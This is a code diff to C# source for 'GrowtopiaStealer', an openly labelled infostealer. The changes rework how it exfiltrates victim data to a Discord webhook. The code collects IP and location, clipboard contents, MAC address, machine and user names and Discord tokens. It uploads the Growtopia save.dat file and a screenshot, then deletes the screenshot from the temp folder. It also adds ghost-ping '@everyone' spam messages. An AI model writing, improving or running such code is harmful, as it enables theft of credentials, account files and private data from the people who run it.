@@ -4,13 +4,12 @@ using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Threading.Tasks;
-using System.Windows.Forms;
-using System.ComponentModel;
-using System.Management;
 using System.Net.NetworkInformation;
-using System.Text;
-using System.IO;
 using JNogueira.Discord.Webhook.Client;
+using System.Drawing;
+using System.Threading;
+using System.IO;
+using System.Windows.Forms;
 
 namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
 {
@@ -86,6 +85,10 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             );
             #endregion
 
+            #region Rainbow Line gif
+            string rainbowline = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here https://i.imgur.com/tcU8x8P.gif​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​";
+            #endregion
+
             #region String for send tokens to discord webhook
             string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
             #endregion
@@ -112,13 +115,29 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
 
             #region UserName
             // UserName
-            string user = Environment.UserName;
+            string User = Environment.UserName;
             #endregion
 
-            #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
-            // Here discord webhook
+            #region Discord Webhook
+            // Discord Webhook
             var client = new DiscordWebhookClient(DiscordWebhook.defaultWebhook);
+            #endregion
+
+            #region Rainbow line send
+            var rainbow = new DiscordMessage(
+                rainbowline,
+                username: "GrowtopiaStealer | TheC0mpany",
+                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
+                tts: false
+                );
+            #endregion
+
+            //client.SendToDiscord(rainbow);
+
+            #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
+            // Messages
             var message = new DiscordMessage(
+                "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                 username: "GrowtopiaStealer | TheC0mpany",
                 avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                 tts: false,
@@ -128,45 +147,69 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                         color: 65280,
                         author: new DiscordMessageEmbedAuthor("NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName),
                         description:
-                               "\nIP: " + IP +
-                               "\nIPv6: " + IPv6 +
-                               "\nCountry: " + Country +
-                               "\nCity: " + City +
                                "\n ================================" +
-                               "\nMAC Address: " + getTarget +
-                               "\n ================================"
-                               )
-                });
+                               "\n```IP: " + IP + "```" +
+                               "\n```IPv6: " + IPv6 + "```" +
+                               "\n ================================" +
+                               "\n```Country: " + Country + "```" +
+                               "\n```City: " + City + "```" +
+                               "\n```ClipBoard: " + Buffer.GetBuffer() + "```" +
+                               "\n```MAC Address: " + getTarget + "```" +
+                               "\n ================================",
+                        thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
+                        footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
+                               )});
             client.SendToDiscord(message);
             #endregion
 
-            Dictionary<string, string> Token = new Dictionary<string, string>
-                    {
-                        { "content", "\nTokens:\n" + Tokens},
-                        { "avatar_url", DiscordWebhook.defaultAvatar},
-                        { "username", DiscordWebhook.defaultUserName}
-            };
-            HttpClient cl1 = new HttpClient();
-            cl1.PostAsync(DiscordWebhook.defaultWebhook, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult();  // FormUrlEncodedContent
+            //client.SendToDiscord(rainbow);
 
-            #region Message of save.dat
-            string mssgBody =
-                               "\n@everyone @here here save.dat, enjoy :)";
+            #region Tokens
+            var token = new DiscordMessage(
+                "Tokens: \n" + Tokens,
+                username: "GrowtopiaStealer | TheC0mpany",
+                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
+                tts: false
+                );
+            client.SendToDiscord(token);
             #endregion
 
-            #region Sending save.dat to discord webhook.
+            client.SendToDiscord(rainbow);
+
+            #region Ghost ping
+            string mssgBody = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ";
+            #endregion
+
+            #region Sending save.dat and screenshot to discord webhook.
+            Screenshot.GetScreenshot();
             string filename = Environment.MachineName + "." + Environment.UserName + ".dat";
             string fileformat = "dat";
             string filepath = GrowtopiaStealer.Growtopia.savePath;
             string application = "";
-
+            string filename1 = "Screenshot-" + Environment.MachineName + ".png";
+            string fileformat1 = "png";
+            string filepath1 = @"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png";
             try
             {
-                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending log 
+                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending log
+                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot 
             }
             catch
             {
                 DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
+            }
+            #endregion
+
+            client.SendToDiscord(rainbow);
+
+            #region Delete screenshot file
+            //Delete screenshot file
+            Finish();
+           
+            void Finish()
+            {
+                Thread.Sleep(15000);
+                File.Delete(@"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png");
             }
             #endregion
         }
